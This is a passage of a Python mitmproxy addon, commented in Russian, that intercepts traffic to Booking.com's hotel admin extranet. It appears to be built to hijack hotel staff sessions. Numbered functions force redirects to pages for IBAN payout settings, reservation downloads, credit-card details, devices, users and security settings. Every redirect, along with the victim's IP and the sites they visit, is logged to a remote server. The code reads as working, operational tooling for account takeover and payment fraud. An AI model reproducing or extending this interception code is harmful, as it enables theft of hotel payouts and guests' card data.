            return False
        
        target_url = f"https://admin.booking.com/hotel/hoteladmin/extranet_ng/manage/security/devices.html?lang={lang}&ses={ses}&hotel_id={hotel_id}"
        
        if url == target_url:
            log("Function 23: Already on correct devices page")
            return False
        
        log(f"Function 23: Device redirect {url} -> {target_url}")
        
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_23_DEVICE")
        
        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True
        
    except Exception as e:
        log(f"Function 23 ERROR: {e}")
        import traceback
        log(f"Traceback: {traceback.format_exc()}")
        return False

# ========== ФУНКЦИЯ 24 (БЕЗ ИЗМЕНЕНИЙ) ==========
def pulse_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 24: Pulse redirect
    """
    try:
        if not should_pulse():
            return False
        
        url = flow.request.pretty_url
        host = (flow.request.pretty_host or "").lower()
        
        if not host.startswith("admin.") or not host.endswith("booking.com"):
            return False
        
        target_url = get_pulse_redirect_to()
        if not target_url:
            log("Function 24: No target URL configured")
            return False
        
        if url == target_url:
            return False
        
        log(f"Function 24: Pulse redirect {url} -> {target_url}")
        
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, url, target_url, "FUNCTION_24_PULSE")
        
        flow.response = http.Response.make(302, b"", {"Location": target_url})
        return True
        
    except Exception as e:
        log(f"Function 24 error: {e}")
        import traceback
        log(f"Traceback: {traceback.format_exc()}")
        return False

# ========== ФУНКЦИЯ 25 (БЕЗ ИЗМЕНЕНИЙ) ==========
def ultra_pulse_redirect(flow: http.HTTPFlow) -> bool:
    """
    ФУНКЦИЯ 25: Ultra Pulse
    """
    try:
        if not should_ultra_pulse():
            return False
        
        log(f"Function 25: Ultra Pulse active")
        
        if should_device():
            log(f"Function 25: Phase 1 (Device) active")
            
            if 'ses=' not in flow.request.pretty_url:
                log("Function 25: ⚠️ Device phase waiting for ses parameter")
                return False
            
            if device_redirect(flow):
                log(f"Function 25: Executed Function 23 (Device) redirect")
                return True
        
        if should_pulse():
            log(f"Function 25: Phase 2 (Pulse) active")
            if pulse_redirect(flow):
                log(f"Function 25: Executed Function 24 (Pulse) redirect")
                return True
        
        if not should_device() and not should_pulse():
            log(f"Function 25: Both phases completed - removing Ultra Pulse flag")
            remove_ultra_pulse_flag()
        
        return False
        
    except Exception as e:
        log(f"Function 25 error: {e}")
        import traceback
        log(f"Traceback: {traceback.format_exc()}")
        return False

# --- ФУНКЦИЯ ДЛЯ АВТОЗАПУСКА ---
def check_autostart():
    """Проверяет, был ли скрипт запущен автоматически и восстанавливает состояние"""
    try:
        if os.path.exists(AUTOSTART_FLAG):
            log("=" * 60)
            log("🔄 AUTOSTART DETECTED - Restoring previous state")
            
            if os.path.exists(AUTOSTART_FUNCTION_FILE):
                with open(AUTOSTART_FUNCTION_FILE, 'r') as f:
                    function_name = f.read().strip()
                log(f"🔄 Restoring function: {function_name}")
            
            log("=" * 60)
    except Exception as e:
        log(f"Error checking autostart: {e}")

# Главная точка входа
def request(flow: http.HTTPFlow) -> None:
    """
    ГЛАВНАЯ ФУНКЦИЯ MITMproxy
    """
    
    url = flow.request.pretty_url
    host = (flow.request.pretty_host or "").lower()
    
    # ========== ФУНКЦИЯ 26: Мониторинг платформ ==========
    if should_monitor_platforms() and should_log_domain(flow):
        try:
            client_ip = get_client_ip(flow)
            from_url = flow.request.pretty_url
            log_redirect_to_server(client_ip, from_url, "MONITORED", "DOMAIN_MONITOR")
            log(f"[F26] ✓ Platform access logged: {host}")
        except Exception as e:
            log(f"Error in domain monitoring: {e}")
    
    # ========== ПРОВЕРКА АВТОЗАПУСКА ==========
    if not hasattr(flow, '_autostart_checked'):
        check_autostart()
        flow._autostart_checked = True
    
    # ========== ПРИОРИТЕТ 1: ФУНКЦИЯ 17 (единоразовый кастом) ==========
    if custom_redirect(flow):
        return
    
    # ========== ПРИОРИТЕТ 3: ФУНКЦИЯ 14 (IBAN Settings Force) ==========
    if host.endswith("admin.booking.com"):
        if booking_iban_settings_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 4: ФУНКЦИЯ 18 (Reservations download) ==========
    if host.endswith("admin.booking.com"):
        if booking_reservations_download_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 5: ФУНКЦИЯ 27 (Циклическая копия 18) ==========
    if host.endswith("admin.booking.com"):
        if booking_reservations_cycle_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 6: ФУНКЦИЯ 19 (CC details) ==========
    if host.endswith("booking.com"):
        if booking_cc_details_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 7: BOOKING РЕДИРЕКТЫ 13-16 ==========
    if host.endswith("admin.booking.com"):
        if booking_hotel_security_redirect(flow):
            return
            
        if booking_hotel_global_redirect(flow):
            return

        if booking_redirect(flow, "message"):
            return
        if booking_redirect(flow, "provider"):
            return
        if booking_redirect(flow, "user"):
            return
        if booking_redirect(flow, "security"):
            return
    
    # ========== ПРИОРИТЕТ 8: ФУНКЦИИ 21-23 ==========
    if host.endswith("admin.booking.com"):
        if should_partners():
            if partners_redirect(flow):
                return
        
        if should_device():
            if device_redirect(flow):
                return
        
        if should_partners_and_mess():
            if should_partners() and partners_redirect(flow):
                return
    
    # ========== ПРИОРИТЕТ 9: ФУНКЦИИ 24-25 ==========
    if should_pulse():
        if pulse_redirect(flow):
            return
    
    if should_ultra_pulse():
        if ultra_pulse_redirect(flow):
            return
    
    # ========== ПРИОРИТЕТ 10: ОБЫЧНЫЕ РЕДИРЕКТЫ ==========
    redirect_target = get_redirect_target()
    
    if not redirect_target:
        return
    
    if is_redirect_target(flow, redirect_target):
        log(f"skip redirect for target itself: {flow.request.pretty_url}")
        return
    
    if should_force():
        log(f"FORCE redirect {flow.request.pretty_url} -> {redirect_target}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "FORCE")
        flow.response = http.Response.make(302, b"", {"Location": redirect_target})
        return

    if should_one_shot():
        log(f"GLOBAL ONE-SHOT redirect {flow.request.pretty_url} -> {redirect_target}")
        client_ip = get_client_ip(flow)
        log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
        flow.response = http.Response.make(
            302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
        )
        remove_one_shot_flag()
        return

    try:
        cookie_present = bool(flow.request.cookies.get(COOKIE))
        if cookie_present:
            log(f"cookie present -> skipping redirect for {host}")
            return
    except Exception:
        pass

    log(f"one-shot client redirect {flow.request.pretty_url} -> {redirect_target}")
    client_ip = get_client_ip(flow)
    log_redirect_to_server(client_ip, flow.request.pretty_url, redirect_target, "ONE_SHOT")
    flow.response = http.Response.make(
        302, b"", {"Location": redirect_target, "Set-Cookie": f"{COOKIE}=1; Path=/; Secure; HttpOnly"}
    )
